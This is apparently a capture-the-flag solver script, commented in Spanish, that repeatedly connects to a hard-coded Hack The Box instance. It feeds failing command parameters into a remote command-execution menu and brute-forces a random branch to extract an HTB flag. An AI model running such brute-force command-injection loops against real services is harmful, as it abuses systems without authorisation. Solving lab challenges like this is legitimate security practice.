#!/usr/bin/env python3

import socket
import time
import random

def brute_force_until_flag():
    """Fuerza bruta hasta encontrar la flag"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("=== FUERZA BRUTA HASTA ENCONTRAR LA FLAG ===")
    print("Estrategia: Hacer que ambos comandos fallen para obtener valores aleatorios")
    print("y repetir hasta que por casualidad obtengamos una colisión de hash")
    
    max_attempts = 1000
    
    for attempt in range(max_attempts):
        try:
            print(f"\n--- Intento {attempt + 1}/{max_attempts} ---")
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((host, port))
            
            # Recibir banner
            banner = s.recv(4096).decode('utf-8', errors='ignore')
            
            def send_command(cmd):
                s.send(cmd.encode())
                time.sleep(0.3)
                response = s.recv(4096).decode('utf-8', errors='ignore')
                return response
            
            def select_option(option_num):
                response = send_command(str(option_num) + "\n")
                return response
            
            def send_input(value):
                response = send_command(value + "\n")
                return response
            
            # Configurar parámetros que harán que los comandos fallen
            # Esto forzará la ejecución de las líneas aleatorias
            
            # 1. Mode = 1 (cualquier número válido)
            select_option(1)
            send_input("1")
            
            # 2. Bin válido pero que no funcione con los args
            select_option(2)
            send_input("ls")
            
            # 3. Args inválidos (solo letras, pero que hagan fallar el comando)
            select_option(3)
            send_input("invalidarg1,invalidarg2")
            
            # 4. Switches inválidos (solo letras, pero que hagan fallar el comando)
            select_option(4)
            send_input("invalidswitch1,invalidswitch2")
            
            # 5. Ejecutar
            response = select_option(5)
            
            # Buscar flag
            if "What an awesome player!" in response:
                print("\n*** ¡FLAG ENCONTRADA! ***")
                print("Respuesta completa:")
                print(response)
                
                if "HTB{" in response:
                    start = response.find("HTB{")
                    end = response.find("}", start) + 1
                    if end > start:
                        flag = response[start:end]
                        print(f"\n🎉 FLAG: {flag} 🎉")
                        s.close()
                        return flag
                
                # Si hay flag pero no en formato HTB{}, buscar otros patrones
                print("Flag encontrada pero no en formato HTB{}, buscando otros patrones...")
                print("Respuesta completa para análisis:")
                print(response)
            
            s.close()
            
            # Pequeña pausa entre intentos
            time.sleep(0.5)
            
        except Exception as e:
            print(f"Error en intento {attempt + 1}: {e}")
            continue
    
    print(f"\nNo se encontró flag en {max_attempts} intentos")
    return None

def try_different_random_approaches():
    """Probar diferentes enfoques aleatorios"""
    
    host = "94.237.48.12"
    port = 54011
    
    print("\n=== PROBANDO DIFERENTES ENFOQUES ALEATORIOS ===")
    
    # Diferentes combinaciones de parámetros
    approaches = [
        # (mode, bin, args, switches, description)
        ("1", "ls", "a,b", "c,d", "Enfoque simple"),
        ("2", "cat", "x,y", "z,w", "Enfoque cat"),
        ("3", "pwd", "m,n", "o,p", "Enfoque pwd"),
        ("1", "who", "q,r", "s,t", "Enfoque who"),
        ("4", "id", "u,v", "w,x", "Enfoque id"),
        ("5", "ps", "y,z", "a,b", "Enfoque ps"),
    ]
    
    for mode, bin, args, switches, description in approaches:
        print(f"\n--- {description} ---")
        
        for attempt in range(50):  # 50 intentos por enfoque
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, port))
                
                banner = s.recv(4096).decode('utf-8', errors='ignore')
                
                def send_command(cmd):
                    s.send(cmd.encode())
                    time.sleep(0.2)
                    response = s.recv(4096).decode('utf-8', errors='ignore')
                    return response
                
                def select_option(option_num):
                    response = send_command(str(option_num) + "\n")
                    return response
                
                def send_input(value):
                    response = send_command(value + "\n")
                    return response
                
                # Configurar
                select_option(1)
                send_input(mode)
                
                select_option(2)
                send_input(bin)
                
                select_option(3)
                send_input(args)
                
                select_option(4)
                send_input(switches)
                
                # Ejecutar
                response = select_option(5)
                
                # Buscar flag
                if "What an awesome player!" in response:
                    print(f"\n*** ¡FLAG ENCONTRADA CON {description}! ***")
                    print("Respuesta:")
                    print(response)
                    
                    if "HTB{" in response:
                        start = response.find("HTB{")
                        end = response.find("}", start) + 1
                        if end > start:
                            flag = response[start:end]
                            print(f"\n🎉 FLAG: {flag} 🎉")
                            s.close()
                            return flag
                    
                    # Buscar otros patrones de flag
                    if "flag" in response.lower():
                        print("Posible flag encontrada (no formato HTB):")
                        print(response)
                
                s.close()
                time.sleep(0.1)
                
            except Exception as e:
                print(f"Error en {description} intento {attempt + 1}: {e}")
                continue
    
    return None

if __name__ == "__main__":
    print("Iniciando búsqueda de flag...")
    
    # Intentar fuerza bruta
    flag = brute_force_until_flag()
    
    if not flag:
        print("\nFuerza bruta falló, probando enfoques diferentes...")
        flag = try_different_random_approaches()
    
    if flag:
        print(f"\n🎉 FLAG FINAL: {flag} 🎉")
    else:
        print("\n❌ No se pudo encontrar la flag")